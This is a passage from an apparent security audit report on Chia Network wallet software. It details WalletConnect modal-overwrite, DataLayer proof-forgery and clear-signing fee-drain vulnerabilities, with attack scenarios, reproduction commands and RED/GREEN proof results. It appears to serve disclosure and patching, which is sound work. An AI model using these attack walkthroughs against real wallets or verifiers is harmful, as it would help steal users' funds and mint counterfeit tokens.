CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k wlc02
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k wlc02
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-WLC-02": {
    "RED": {
      "clawback_coin_id": "e088f25d50be49d29eb144248071f377d5f7bbdb5d7dd34078c9c72276a0b649",
      "clawback_amount_mojo": 500000000000,
      "t1_cold_reloaded_sqlite_spent": true,
      "t2_sender_cancel_tx_count": 0,
      "t3_poc10_matches_victim": false,
      "t4_recipient_claim_spend_bundle_sha256": "33361e6b2d8ee0d9bdd37738c4b2e54ece03c1eb507de8e59b370a1bd100e1e1",
      "t4_recipient_claim_bytes": 930
    },
    "GREEN": {
      "t1_cold_reloaded_sqlite_spent": false,
      "t2_sender_cancel_tx_count": 1,
      "t3_poc10_matches_victim": true,
      "sender_clawback_cancel_succeeded": true
    }
  }
}
```


---

### III.22 — Chia-Network/chia-blockchain-gui (`<= 2.6.1-rc2.dev60 (verified on commit 2f6ee83a23ac8b0370b96111e02f8edfb81fa1f3)`) — Chia Desktop GUI WalletConnect Unscoped 29-Command Grant & Concurrent Confirmation Modal Overwrite TOCTOU (`GUI-WC-01`) (`CWE-367 / CWE-285`, CVSS `8.8 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain-gui` (`npm / TypeScript (Electron Desktop GUI): chia-blockchain-gui`)
* **Affected Versions & Components:** `<= 2.6.1-rc2.dev60 (verified on commit 2f6ee83a23ac8b0370b96111e02f8edfb81fa1f3)` — `packages/gui/src/components/walletConnect/WalletConnectContext.tsx:314-441`, `constants/WalletConnectCommands.ts`
* **Vulnerability Class & Score:** `CWE-367 / CWE-285` — **CVSS v3.1: `8.8 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md`](advisories/zh-CN/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — All 29 WalletConnect Commands Exposed Upon Pairing (`constants/WalletConnectCommands.ts`):** When a user connects their Chia desktop wallet to any website/dApp (even one claiming to only check an address or NFT eligibility), the WalletConnect session namespace grants access to all 29 RPC commands, including `chia_sendTransaction`, `chia_spendCAT`, and `chia_takeOffer`.
2. **Step 2 — Concurrent Request Modal Overwrite (`WalletConnectContext.tsx:314-441`):** `handleSessionRequest` does not serialize incoming JSON-RPC requests with a FIFO lock. When a malicious dApp sends a benign `chia_getCurrentAddress` request followed milliseconds later by `chia_sendTransaction`, the confirmation state/promise overlaps so that clicking Approve on the benign prompt dispatches `chia_sendTransaction` (`0.5 XCH` signed `SpendBundle SHA-256: d2ce22645a9a23b165da6f3895d1139ed334a91aaef4e56d027f8b0c12754980`).
3. **Step 3 — Post-Approval Context Switch (`TOCTOU` on Fingerprint, Network, and Pairing):** Between the moment the user clicks Approve (`check`) and `sendCommand` execution (`use`), `WalletConnectContext.tsx` does not verify that the active key fingerprint, network (`mainnet`/`testnet`), and pairing session still match the approved snapshot.

```typescript
// File: packages/gui/src/components/walletConnect/WalletConnectContext.tsx (lines 314-441)
async function handleSessionRequest(event: SignClientTypes.EventArguments['session_request']) {
  // BUG 1: No FIFO mutex/queue serializing concurrent session_request events
  // BUG 2: No immutable binding of (requestId, method, paramsHash, fingerprint, network) in sendCommand
  const confirmed = await showConfirmationDialog(event);
  if (confirmed) {
    return await sendCommand(command, params);
  }
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — 'Free Chia Airdrop / Address Checker' Website Drains Wallet Behind a `getCurrentAddress` Prompt:** A victim connects their desktop wallet to a dApp and sees a harmless `chia_getCurrentAddress` modal. In the same millisecond, the dApp sends `chia_sendTransaction` (`500,000,000,000 mojo` = `0.5 XCH`). When the victim clicks Confirm, `WalletRpcClient.send_transaction` executes and broadcasts signed `SpendBundle` `d2ce22645a9a23b165da6f3895d1139ed334a91aaef4e56d027f8b0c12754980`.
* **Scenario B — Burner-Wallet to Cold/Main-Wallet Fingerprint Switch (`TOCTOU`):** A user pairs a 0-XCH burner key (`fingerprint: 111111`), but a concurrent fingerprint/context switch causes `sendCommand` to execute the spend against the user's `999999` main wallet.
* **Scenario C — Post-Disconnect Replay During Pending Confirmation:** Even if the user disconnects the pairing or switches networks while a confirmation promise is in flight, unpatched `sendCommand` still dispatches the RPC call (`GREEN` blocks all 3 vectors: `concurrent_rejected`, `context_switch_rejected`, `unknown_method_rejected`).

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect handleSessionRequest and sendCommand in WalletConnectContext.tsx
sed -n '314,441p' /home/community-user/targets/chia-blockchain-gui/packages/gui/src/components/walletConnect/WalletConnectContext.tsx

# 2. Run the Live WSS Relay -> GUI Handler -> WalletRpcClient E2E Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k gui_wc01
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k gui_wc01
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-GUI-WC-01": {
    "RED": {
      "displayed_prompt_method": "chia_getCurrentAddress",
      "concurrent_injected_method": "chia_sendTransaction",
      "modal_overwritten_by_second_request": true,
      "unauthorized_send_transaction_dispatched": true,
      "drained_amount_mojo": 500000000000,
      "signed_spend_bundle_sha256": "d2ce22645a9a23b165da6f3895d1139ed334a91aaef4e56d027f8b0c12754980"
    },
    "GREEN": {
      "distinct_wss_packets_tested": 6,
      "benign_get_current_address_succeeded": true,
      "benign_send_transaction_succeeded": true,
      "concurrent_modal_overwrite_rejected": true,
      "fingerprint_network_pairing_switch_rejected": true,
      "unknown_method_rejected": true
    }
  }
}
```


---

### III.23 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia DataLayer `WalletRpcApi.dl_verify_proof` Missing Singleton Lineage Verification Allowing 1-Mojo Counterfeit Proofs & Unbacked `100,000 CAT` On-Chain Minting (`DL-01`) (`CWE-347 / CWE-345`, CVSS `9.1 Critical`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/rpc/wallet_rpc_api.py:4066-4120` (`dl_verify_proof`), `chia/data_layer/data_layer_util.py`
* **Vulnerability Class & Score:** `CWE-347 / CWE-345` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md`](advisories/zh-CN/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Missing Singleton Top-Layer & Launcher Lineage Check in `WalletRpcApi.dl_verify_proof` (`chia/rpc/wallet_rpc_api.py:4066-4120`):** When verifying a `DLProof` (`ProofOfInclusion`), `dl_verify_proof` confirms that the referenced coin (`coin_id`) was spent on-chain and that its inner puzzle announcement matches the Merkle root of the key/value pairs, plus checks `dl_wallet.get_latest_singleton(store_id)` for existence. However, it **never calls `match_dl_singleton`** on the proof's parent coin spend to verify that the coin is actually the canonical DataLayer singleton for `store_id`!
2. **Step 2 — 1-Mojo Non-Singleton Coin Forges Any Official `store_id` Root:** An attacker spends a 1-mojo standard non-singleton coin (`coin_id: 86ec0dd71fbc7e415e06dc504e8e74436cf4f60d2f4ab942fc2104685b20dd17`) whose puzzle emits the announcement format expected by `dl_verify_proof` while referencing the victim institution's `store_id` (`806a6c73c7344b24d23915a319f82da69e1129a70e3ef772da2be14de2b4a5d6`). `WalletRpcApi.dl_verify_proof` returns `{"verified": true, "verified_clvm_hashes": true, "current_root": true}`.
3. **Step 3 — End-to-End On-Chain Minting of `100,000 CAT` (`100,000,000 CAT mojo`):** When a bridge, RWA issuer, or carbon-credit minter gates token issuance on `WalletRpcApi.dl_verify_proof`, the forged 1-mojo proof triggers a real `CATWallet` issuance (`cat_asset_id: 73dc2527f5a75964c9b1b019def41d17aaa1f22d42235f479114c2e505f679f5`, `issuance SpendBundle SHA-256: 6a635760183480c0c94ccf7786c1700fa5b7d7b0ae2532da49ff22edc3257c5e`, `delivery SpendBundle SHA-256: dc3f0bbaac81e982baa174241b3a69fba1b8a34e7033d8e1465ecd832ea18196`), crediting the attacker with `100,000 CAT` on-chain.

```python
# File: chia/rpc/wallet_rpc_api.py (lines 4066-4120)
async def dl_verify_proof(self, request: dict[str, Any]) -> EndpointResult:
    proof = DLProof.from_json_dict(request)
    verified_clvm_hashes = dl_verify_proof(proof)
    # BUG: Verifies coin existence and Merkle hash, but NEVER verifies that the parent coin spend
    # matches SINGLETON_TOP_LAYER_MOD with launcher_id == proof.store_proofs.store_id!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — 1-Mojo Counterfeit DataLayer Reserve Proof Mints `100,000 CAT` (`100,000,000 CAT mojo`) On-Chain:** An institutional RWA/stablecoin bridge tracks collateralized minting approvals in DataLayer store `806a6c73c7344b24d23915a319f82da69e1129a70e3ef772da2be14de2b4a5d6` (backed by `1,000 XCH` collateral). The attacker spends a 1-mojo non-singleton coin (`86ec0dd71fbc7e41...`) announcing `mint_allowance=100000000` and submits the `DLProof` to `WalletRpcApi.dl_verify_proof`. Because `dl_verify_proof` returns `verified: true, current_root: true`, the bridge mints and delivers `100,000 CAT` on-chain (`SpendBundle` `dc3f0bbaac81e982baa174241b3a69fba1b8a34e7033d8e1465ecd832ea18196`).
* **Scenario B — Side-by-Side Intrinsic RPC Forgery Against Any Third-Party Verifier (`test_dl01_side_by_side_canonical_vs_counterfeit_dl_verify_proof`):** Even without a bridge consumer, calling `WalletRpcApi.dl_verify_proof` directly with a canonical singleton proof vs. a 1-mojo non-singleton counterfeit proof returns identical `verified: true` responses in `RED`, proving the defect is intrinsic to Chia's RPC verifier.
* **Scenario C — Counterfeit Carbon-Credit / Registry Audit Attestations:** An attacker forges retirement or issuance records against an official climate registry's `store_id` using a 1-mojo coin spend.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect WalletRpcApi.dl_verify_proof in chia/rpc/wallet_rpc_api.py
sed -n '4066,4120p' /home/community-user/targets/chia-blockchain/chia/rpc/wallet_rpc_api.py

# 2. Run both the Intrinsic Side-by-Side RPC Test and the 100,000 CAT On-Chain Mint Test (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k dl01
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k dl01
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-DL-01": {
    "RED": {
      "victim_store_id": "806a6c73c7344b24d23915a319f82da69e1129a70e3ef772da2be14de2b4a5d6",
      "forged_non_singleton_coin_id": "86ec0dd71fbc7e415e06dc504e8e74436cf4f60d2f4ab942fc2104685b20dd17",
      "dl_verify_proof_verified": true,
      "dl_verify_proof_current_root": true,
      "cat_asset_id": "73dc2527f5a75964c9b1b019def41d17aaa1f22d42235f479114c2e505f679f5",
      "cat_issuance_spend_bundle_sha256": "6a635760183480c0c94ccf7786c1700fa5b7d7b0ae2532da49ff22edc3257c5e",
      "cat_delivery_spend_bundle_sha256": "dc3f0bbaac81e982baa174241b3a69fba1b8a34e7033d8e1465ecd832ea18196",
      "attacker_minted_cat_mojo": 100000000,
      "attacker_minted_cat_tokens": 100000
    },
    "GREEN": {
      "canonical_singleton_proof_verified": true,
      "counterfeit_non_singleton_proof_verified": false,
      "attacker_minted_cat_mojo": 0
    }
  }
}
```


---

### III.24 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Permissive `Condition::Other` Bypass Allowing Hidden `750 XCH` Fee Drain & NFT Transfer-Program Spoofing (`CS-01` / `POC-1 & POC-2`) (`CWE-451 / CWE-345`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs`, `crates/chia-sdk-driver/src/clear_signing/tests.rs`
* **Vulnerability Class & Score:** `CWE-451 / CWE-345` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md`](advisories/zh-CN/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Parser Divergence Between Consensus CLVM (`chia_rs`) and `cni-wallet-sdk` (`clear_signing.rs`):** Chia's consensus CLVM engine ignores extra trailing arguments on condition opcodes such as `RESERVE_FEE` (`(52 amount extra_atom)`), executing the full fee reservation on-chain. However, `cni-wallet-sdk` parses conditions using strict fixed-arity structs and silently wraps any condition with trailing atoms into `Condition::Other(NodePtr)` instead of rejecting it.
2. **Step 2 — Hidden `750 XCH` (`750,000,000,000,000 mojo`) Fee Drain (`POC-1`):** In `SpendBundle` `b9b614d01ee2b104325a7dde22c33c498ed9e2e6925f957411d9d9d162f06e5c` (`1,105 bytes`), a vault spend emits an overlong `RESERVE_FEE` condition for `750 XCH`. Unpatched Clear-Signing ignores `Condition::Other` and displays `reserved_fee: 0` to the hardware/mobile signer while consensus consumes `750 XCH`.
3. **Step 3 — Unvalidated NFT `-24` Transfer-Program / Metadata State Mutation (`POC-2`):** Similarly, non-canonical or uninspected NFT state conditions in `SpendBundle` `17d2796f8bd6b9bf9fc1f03cb0570be6ac6393215c27cf61718b2eb9924dd128` (`3,274 bytes`) alter NFT control on-chain while being omitted from the Clear-Signing summary.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Condition::Other(_) variants (such as overlong RESERVE_FEE opcode 52 or unparsed NFT opcodes)
// are silently ignored instead of returning Error::UnsupportedCondition / failing closed:
match condition {
    Condition::ReserveFee(fee) => reserved_fee += fee.amount,
    Condition::Other(_) => { /* silently ignored in unpatched RED! */ }
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Draining `750 XCH` (`750,000,000,000,000 mojo`) from an Enterprise Vault via Hidden `RESERVE_FEE` (`POC-1`):** An attacker proposes a routine Vault transaction (`SpendBundle SHA-256: b9b614d01ee2b104325a7dde22c33c498ed9e2e6925f957411d9d9d162f06e5c`). The Clear-Signing screen on the signer's device reports `reserved_fee = 0`, inducing the custodian to sign; when broadcast, `750 XCH` is drained as block fee (`consensus_reserved_fee_mojo: 750000000000000`).
* **Scenario B — Silent NFT Ownership / Transfer-Program Hijack (`POC-2`):** A collector signs an NFT transaction (`SpendBundle SHA-256: 17d2796f8bd6b9bf9fc1f03cb0570be6ac6393215c27cf61718b2eb9924dd128`) whose Clear-Signing preview shows a benign update while the unparsed condition mutates the NFT state on-chain.
* **Scenario C — Colluding Pool / Farmer Fee Extraction:** An attacker partners with a farmer or mempool relayer to capture the hidden `750 XCH` fee output immediately upon block inclusion.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run the Clear-Signing Rust Proof Suite in cni-wallet-sdk (POC-1 & POC-2)
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc1_and_poc2 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-01": {
    "RED": {
      "poc1_spend_bundle_sha256": "b9b614d01ee2b104325a7dde22c33c498ed9e2e6925f957411d9d9d162f06e5c",
      "poc1_spend_bundle_bytes": 1105,
      "poc1_clear_signing_displayed_fee_mojo": 0,
      "poc1_consensus_drained_fee_mojo": 750000000000000,
      "poc2_spend_bundle_sha256": "17d2796f8bd6b9bf9fc1f03cb0570be6ac6393215c27cf61718b2eb9924dd128",
      "poc2_spend_bundle_bytes": 3274
    },
    "GREEN": {
      "poc1_rejected_fail_closed": true,
      "poc2_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.25 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Uninspected NFT `NEW_METADATA_INFO` Updater Conditions Allowing Hidden `500 XCH` Drain (`CS-02` / `POC-3`) (`CWE-451 / CWE-345`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (`NEW_METADATA_INFO` evaluation)
* **Vulnerability Class & Score:** `CWE-451 / CWE-345` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md`](advisories/zh-CN/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — NFT State Layer Executes Conditions Returned by the Metadata Updater Program:** Under Chia's CHIP-0007 NFT standard, when an inner spend emits a `NEW_METADATA_INFO` (`-24`) condition, the NFT state layer executes the metadata updater puzzle and merges any returned conditions into the spend's output conditions.
2. **Step 2 — Clear-Signing Discards Additional Conditions Emitted by the Metadata Updater (`clear_signing.rs`):** While `cni-wallet-sdk` evaluates the metadata updater to inspect updated metadata, it discards additional consensus conditions (such as `RESERVE_FEE` for `500 XCH` = `500,000,000,000,000 mojo`) returned by the updater program.
3. **Step 3 — `500 XCH` Drained Behind a '0 Fee' NFT Update Preview (`SpendBundle SHA-256: b314b6d7411bfb8a...`):** In `SpendBundle` `b314b6d7411bfb8a87bd4b091a117b861e5a171ed4a0a4712955c592962042e6` (`3,300 bytes`), the user sees `reserved_fee = 0` on the Clear-Signing screen while consensus drains `500 XCH`.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Evaluates NEW_METADATA_INFO metadata updater program for metadata diff,
// but ignores extra consensus conditions (e.g. RESERVE_FEE 500 XCH) returned by the updater!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — 'Free NFT Metadata Reveal' Transaction Drains `500 XCH` (`500,000,000,000,000 mojo`):** A user signs an NFT reveal/update bundle (`b314b6d7411bfb8a87bd4b091a117b861e5a171ed4a0a4712955c592962042e6`) displaying `reserved_fee = 0` in Clear-Signing, losing `500 XCH` to consensus fees upon broadcast.
* **Scenario B — Malicious Custom Metadata Updater in Traded NFTs:** An attacker mints an NFT with a custom metadata updater puzzle and sells/transfers it to a vault; when the vault later updates or transfers the NFT, the hidden updater condition triggers.
* **Scenario C — Patched Verification (`GREEN`):** The patched driver rejects any metadata updater output emitting unexpected consensus conditions.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-3 (500 XCH NFT Metadata Updater Hidden Fee) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc3 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-02": {
    "RED": {
      "poc3_spend_bundle_sha256": "b314b6d7411bfb8a87bd4b091a117b861e5a171ed4a0a4712955c592962042e6",
      "poc3_spend_bundle_bytes": 3300,
      "clear_signing_displayed_fee_mojo": 0,
      "consensus_drained_fee_mojo": 500000000000000
    },
    "GREEN": {
      "poc3_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.26 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Dependent Offer Leg Set-Intersection Outflow Omission Hiding `500 XCH` Payment (`CS-03` / `POC-4`) (`CWE-682 / CWE-451`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (dependent offer leg aggregation)
* **Vulnerability Class & Score:** `CWE-682 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md`](advisories/zh-CN/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Set-Intersection Filtering Across Dependent Settlement Legs (`clear_signing.rs`):** When a Vault transaction participates in a multi-leg Offer settlement (`POC-4`), `cni-wallet-sdk` correlates notarized payments across legs using set intersection rather than union/full conservation.
2. **Step 2 — Non-Overlapping `500 XCH` (`500,000,000,000,000 mojo`) Outflow Dropped from Signing Preview:** In `POC-4` (vault spend `3c55638a605214afd4e6ca592d439b6e9b69e4550f40ce07f85daec8cef87fb8`, settlement spend `7c05b725fb43d8fae280b3e1cd0417b752598e8ce9bd7ae45c1a2f7b63ccf525`), the secondary `500 XCH` payment leg to the attacker is excluded by the set intersection check and never shown in the Clear-Signing summary.
3. **Step 3 — Full `500 XCH` Outflow Executes On-Chain:** Once signed, both settlement legs execute on-chain and transfer `500 XCH` to the attacker.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Uses set intersection across dependent settlement legs instead of accounting for every
// notarized payment outflow funded by the vault's settlement coins!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Hidden `500 XCH` (`500,000,000,000,000 mojo`) Leg in a P2P Offer (`POC-4`):** A trader accepts a multi-leg Offer (`vault SpendBundle: 3c55638a605214afd4e6ca592d439b6e9b69e4550f40ce07f85daec8cef87fb8`) whose Clear-Signing preview omits the `500 XCH` settlement leg (`7c05b725fb43d8fae280b3e1cd0417b752598e8ce9bd7ae45c1a2f7b63ccf525`).
* **Scenario B — OTC Treasury Swap Drain:** An institutional treasury signs what appears to be a small fee/test swap while a disjoint `500 XCH` settlement leg drains treasury funds.
* **Scenario C — Patched Verification (`GREEN`):** All settlement payment legs funded by the vault are unioned and strictly validated.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-4 (500 XCH Dependent Offer Leg Set-Intersection Omission) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc4 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-03": {
    "RED": {
      "poc4_vault_spend_bundle_sha256": "3c55638a605214afd4e6ca592d439b6e9b69e4550f40ce07f85daec8cef87fb8",
      "poc4_settlement_spend_bundle_sha256": "7c05b725fb43d8fae280b3e1cd0417b752598e8ce9bd7ae45c1a2f7b63ccf525",
      "omitted_outflow_mojo": 500000000000000
    },
    "GREEN": {
      "poc4_rejected_or_fully_accounted": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.27 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Unrevealed Settlement Spend Blind Spot Allowing Post-Signature `600 XCH` Drain (`CS-04` / `POC-5`) (`CWE-345 / CWE-451`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (unrevealed settlement output handling)
* **Vulnerability Class & Score:** `CWE-345 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md`](advisories/zh-CN/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Settlement Coins Require No Signature to Spend Once Created:** Any coin created at `SETTLEMENT_PAYMENT_HASH` can be spent by anyone who supplies a matching notarized payment solution (unless constrained by a signed announcement in the parent vault spend).
2. **Step 2 — Clear-Signing Accepts Bundles Where the Created Settlement Coin Is Left Unspent (`clear_signing.rs`):** In `POC-5`, the signing bundle (`a9eeda2c8526d95cb0a36ffcdf9a026b23e96c11e15ee419938e18dc342277eb`, `1,303 bytes`) creates a `600 XCH` (`600,000,000,000,000 mojo`) settlement coin without including its spend in the preview bundle. Unpatched Clear-Signing does not report an external outflow.
3. **Step 3 — Attacker Attaches the Settlement Spend (`e0b876fbb8e0f264...`) Post-Signing:** After the victim signs the vault spend, the attacker appends the `600 XCH` settlement spend (`388 bytes`) and broadcasts the combined bundle on-chain.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Allows a vault spend to create a SETTLEMENT_PAYMENT_HASH coin without requiring
// the corresponding settlement CoinSpend to be revealed and verified in the signing bundle!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Post-Signing Attachment of an Unrevealed `600 XCH` (`600,000,000,000,000 mojo`) Settlement Spend (`POC-5`):** The victim reviews and signs vault bundle `a9eeda2c8526d95cb0a36ffcdf9a026b23e96c11e15ee419938e18dc342277eb`; the attacker attaches `e0b876fbb8e0f26400a38fb5e2e9963a5cb1dbff92b76d78b4403ed0cb2f7cbe` and sweeps `600 XCH`.
* **Scenario B — Hardware Wallet Blind Signing via Deferred Settlement Reveal:** Air-gapped hardware signers see zero external recipients during review while signing away `600 XCH` into an unrevealed settlement coin.
* **Scenario C — Patched Verification (`GREEN`):** Any unspent/unrevealed settlement output in a Clear-Signing bundle is rejected fail-closed.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-5 (600 XCH Unrevealed Settlement Spend Blind Spot) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
